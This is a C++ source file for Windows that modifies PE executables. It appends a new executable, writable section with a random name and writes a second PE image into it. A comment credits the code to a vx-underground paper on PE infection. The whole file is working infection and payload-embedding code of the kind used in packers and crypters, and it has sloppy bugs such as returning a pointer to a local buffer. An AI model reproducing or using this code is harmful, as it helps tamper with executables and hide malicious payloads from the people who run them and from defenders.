#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include "SectionWork.h"

struct DATA {
    LPVOID data;
    DWORD size;
};


// AddSection Totally Stolen 
// from 
// https://papers.vx-underground.org/papers/Windows/Infection/2015-03-06%20-%20PE%20Infection%20-%20Add%20a%20PE%20section%20-%20with%20code.txt


DWORD align(DWORD size, DWORD align, DWORD addr) {
    if (!(size % align))
        return addr + size;
    return addr + (size / align + 1) * align;
}


const char* GetRandomSectionName() {

    char randomChars[6];

    ZeroMemory(randomChars, '\0');
    randomChars[0] = '.';
    srand(time(NULL));
    for (int i = 1; i < 5; ++i) {
        randomChars[i] = 'a' + rand() % 26; // starting on 'a', ending on 'z'
    }
    randomChars[5] = '\0';

    return randomChars;
}


BOOL AddSection(const char* filepath, const char* sectionName, DWORD sizeOfSection) {

    HANDLE file = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD fileSize = GetFileSize(file, NULL);
    //so we know how much buffer to allocate
    BYTE* pByte = new BYTE[fileSize];
    DWORD dw;
    //lets read the entire file,so we can use the PE information
    ReadFile(file, pByte, fileSize, &dw, NULL);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE; //invalid PE

    PIMAGE_NT_HEADERS NT_HEADER = (PIMAGE_NT_HEADERS)((DWORD64)pByte + dos->e_lfanew);
    PIMAGE_FILE_HEADER FH = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
    PIMAGE_OPTIONAL_HEADER OH = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
    PIMAGE_SECTION_HEADER SH = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    if (NT_HEADER->FileHeader.NumberOfSections <= 6) {

        ZeroMemory(&SH[FH->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
        CopyMemory(&SH[FH->NumberOfSections].Name, sectionName, 8);
        //We use 8 bytes for section name,cause it is the maximum allowed section name size

        //lets insert all the required information about our new PE section
        SH[FH->NumberOfSections].Misc.VirtualSize = align(sizeOfSection, OH->SectionAlignment, 0);
        SH[FH->NumberOfSections].VirtualAddress = align(SH[FH->NumberOfSections - 1].Misc.VirtualSize, OH->SectionAlignment, SH[FH->NumberOfSections - 1].VirtualAddress);
        SH[FH->NumberOfSections].SizeOfRawData = align(sizeOfSection, OH->FileAlignment, 0);
        SH[FH->NumberOfSections].PointerToRawData = align(SH[FH->NumberOfSections - 1].SizeOfRawData, OH->FileAlignment, SH[FH->NumberOfSections - 1].PointerToRawData);
        SH[FH->NumberOfSections].Characteristics = 0xE00000E0;
        /*
            0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                         IMAGE_SCN_CNT_CODE  |
                         IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                         IMAGE_SCN_MEM_EXECUTE |
                         IMAGE_SCN_CNT_INITIALIZED_DATA |
                         IMAGE_SCN_MEM_READ
        */
        SetFilePointer(file, SH[FH->NumberOfSections].PointerToRawData + SH[FH->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
        //end the file right here,on the last section + it's own size
        SetEndOfFile(file);
        //now lets change the size of the image,to correspond to our modifications
        //by adding a new section,the image size is bigger now
        OH->SizeOfImage = SH[FH->NumberOfSections].VirtualAddress + SH[FH->NumberOfSections].Misc.VirtualSize;
        //and we added a new section,so we change the NOS too
        FH->NumberOfSections += 1;
        SetFilePointer(file, 0, NULL, FILE_BEGIN);
        //and finaly,we add all the modifications to the file
        WriteFile(file, pByte, fileSize, &dw, NULL);

    }
    else {
        CloseHandle(file);
        return FALSE;
    }
    CloseHandle(file);
    return TRUE;

}

BOOL AddPE2Section(const char* filepath, DATA pe) {

    DWORD BytesRead;
    
    HANDLE fileHandle = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (fileHandle == INVALID_HANDLE_VALUE) {
        printf("\n[-] Failed to get handle to the file (%u)\n", GetLastError());
        return FALSE;
    }
    DWORD filesize = GetFileSize(fileHandle, NULL);
    
    BYTE* PEdata = new BYTE[filesize];
    
    
    ReadFile(fileHandle, PEdata, filesize, &BytesRead, NULL);
    
    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)PEdata;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)PEdata + DOS_HEADER->e_lfanew);
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);
    
    PIMAGE_SECTION_HEADER last = SECTION_HEADER + (NT_HEADER->FileHeader.NumberOfSections - 1);

    SetFilePointer(fileHandle, last->PointerToRawData, NULL, FILE_BEGIN);
    
    WriteFile(fileHandle, pe.data, pe.size, &BytesRead, 0);

    CloseHandle(fileHandle);

    return TRUE;

}

